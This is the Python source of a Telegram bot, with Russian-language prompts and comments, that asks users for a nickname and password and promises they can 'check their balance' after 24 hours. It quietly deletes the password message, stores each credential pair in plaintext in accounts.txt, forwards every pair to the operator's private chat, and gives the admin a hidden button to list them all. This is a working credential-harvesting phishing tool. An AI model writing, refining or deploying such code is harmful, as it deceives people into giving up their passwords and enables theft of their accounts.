import os
import telebot
from telebot import types

# Получаем токен бота и ID админа из скрытых переменных Railway
BOT_TOKEN = os.environ.get('BOT_TOKEN')
try:
    ADMIN_ID = int(os.environ.get('ADMIN_ID', 0))
except (ValueError, TypeError):
    ADMIN_ID = 0

bot = telebot.TeleBot(BOT_TOKEN)
DB_FILE = "accounts.txt"
user_steps = {}

# Клавиатура только для вас
def get_admin_keyboard():
    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
    keyboard.add(types.KeyboardButton("Посмотреть аккаунты 🔒"))
    return keyboard

@bot.message_handler(commands=['start'])
def start_message(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    user_steps[chat_id] = {'step': 'nickname'}
    
    if user_id == ADMIN_ID:
        bot.send_message(chat_id, "Привет! Какой твой ник?", reply_markup=get_admin_keyboard())
    else:
        bot.send_message(chat_id, "Привет! Какой твой ник?", reply_markup=types.ReplyKeyboardRemove())

@bot.message_handler(func=lambda message: message.text == "Посмотреть аккаунты 🔒")
def show_accounts(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        return 
        
    if not os.path.exists(DB_FILE) or os.path.getsize(DB_FILE) == 0:
        bot.send_message(message.chat.id, "База данных пока пуста.")
        return
        
    with open(DB_FILE, "r", encoding="utf-8") as file:
        accounts_data = file.read()
        
    bot.send_message(message.chat.id, f"Список зарегистрированных аккаунтов:\n\n{accounts_data}")

@bot.message_handler(func=lambda message: True)
def handle_messages(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if chat_id not in user_steps:
        bot.send_message(chat_id, "Пожалуйста, введите /start для начала.")
        return

    current_step = user_steps[chat_id].get('step')

    if current_step == 'nickname':
        user_steps[chat_id]['nickname'] = message.text
        user_steps[chat_id]['step'] = 'password'
        bot.send_message(chat_id, "Какой пароль?")
        
    elif current_step == 'password':
        nickname = user_steps[chat_id]['nickname']
        password = message.text
        
        # 1. Удаляем сообщение пользователя с паролем для конфиденциальности
        try:
            bot.delete_message(chat_id, message.message_id)
        except Exception:
            pass

        log_entry = f"Ник: {nickname} Пароль: {password}"

        # 2. Записываем в файл (для кнопки)
        with open(DB_FILE, "a", encoding="utf-8") as file:
            file.write(log_entry + "\n")
            
        # 3. Сразу дублируем вам в ЛС (чтобы данные не пропали при перезапуске хоста)
        if ADMIN_ID != 0:
            try:
                bot.send_message(ADMIN_ID, f"🔔 Новый аккаунт!\n{log_entry}")
            except Exception:
                pass

        bot.send_message(chat_id, "Спасибо! Заходи через 24 часа и смотри баланс!")
        
        if user_id == ADMIN_ID:
            user_steps[chat_id] = {'step': 'nickname'}
        else:
            del user_steps[chat_id]

if __name__ == '__main__':
    bot.infinity_polling()
  
